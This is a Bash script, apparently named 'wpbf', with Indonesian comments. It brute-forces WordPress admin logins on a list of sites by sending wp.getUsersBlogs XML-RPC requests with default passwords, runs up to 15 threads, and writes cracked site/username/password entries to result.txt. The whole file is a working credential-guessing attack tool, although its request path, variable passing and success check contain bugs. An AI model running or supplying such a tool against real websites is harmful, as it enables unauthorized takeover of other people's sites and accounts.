#!/bin/bash
R=$(tput setaf 1)
B=$(tput setaf 6)
H=$(tput setaf 3)
N=$(tput sgr0)
function bruteforce() {
url="$urls/xmlrpc.php"
usernames=("admin")

# Masukkan daftar password
passwords=("admin" "pass")
for username in "${usernames[@]}"; do

  # Looping melalui daftar password
  for password in "${passwords[@]}"; do

    # Buat permintaan XMLRPC
    local response=$(curl -s -X POST "$url/xmlrpc.php" \
      -H "Content-Type: text/xml" \
      -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$username</string></value></param><param><value><string>$password</string></value></param></params></methodCall>")
    case "$response" in
      *"<member><name>blogName</name><value><string>My Blog</string></value></member>"*)
        # echo "Sukses login dengan username: $username dan password: $password"
        # echo "$url|$username|$password" >>
        echo "${urls}/wp-login.php|$username|$password" >> result.txt
        echo -e "${H}${url} [$username|$password]"
        ;;
      *)
        echo -e "${url} [$username|$password] [${R}Failed${C}]\n"
        ;;

    esac
  done
   break
done
}
echo -e "
${B}                _      __ 
__      ___ __ | |__  / _|
\ \ /\ / / '_ \| '_ \| |_ 
 \ V  V /| |_) | |_) |  _|
  \_/\_/ | .__/|_.__/|_|  
         |_|              
           
                         
\tby (localhe)
"
echo -ne "${N}list :";read lst
[ ! -f $lst ] && echo "${R}file does not exist!"
(
  LIMIT="15" # thread
  for urls in $(cat $lst); do
      ((thread=thread%LIMIT)); ((thread++==0)) && wait
      bruteforce "$url" &
  done
  wait
)